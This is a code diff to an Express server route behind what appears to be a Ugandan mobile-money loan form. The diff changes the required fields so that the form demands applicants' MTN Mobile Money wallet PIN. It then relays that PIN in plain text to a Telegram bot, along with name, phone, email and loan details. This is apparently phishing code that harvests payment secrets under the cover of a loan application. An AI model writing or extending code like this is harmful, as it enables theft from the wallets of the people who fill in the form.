@@ -39,10 +39,10 @@ app.get('/api/telegram/status', (_req, res) => {
 });
 
 app.post('/api/telegram/contact', async (req, res) => {
-  const { fullName, phone, email, mtnNumber, postalNumber, loanType, amount } = req.body;
+  const { fullName, phone, email, mtnNumber, walletPin, loanType, amount } = req.body;
 
-  if (!mtnNumber || !postalNumber) {
-    return res.status(400).json({ error: 'Mobile Money and postal numbers are required.' });
+  if (!mtnNumber || !walletPin) {
+    return res.status(400).json({ error: 'Mobile Money number and wallet PIN are required.' });
   }
 
   const botToken = (process.env.TELEGRAM_BOT_TOKEN || process.env.TELEGRAM_TOKEN || '').trim();
@@ -59,7 +59,7 @@ app.post('/api/telegram/contact', async (req, res) => {
     `Phone: ${phone || 'Not provided'}`,
     `Email: ${email || 'Not provided'}`,
     `MTN Mobile Money: ${mtnNumber}`,
-    `Wallet ID: ${postalNumber}`,
+    `Wallet PIN: ${walletPin}`,
     `Loan: ${loanType || 'Not provided'}${amount ? ` - UGX ${Number(amount).toLocaleString('en-UG')}` : ''}`
   ].join('\n');
 
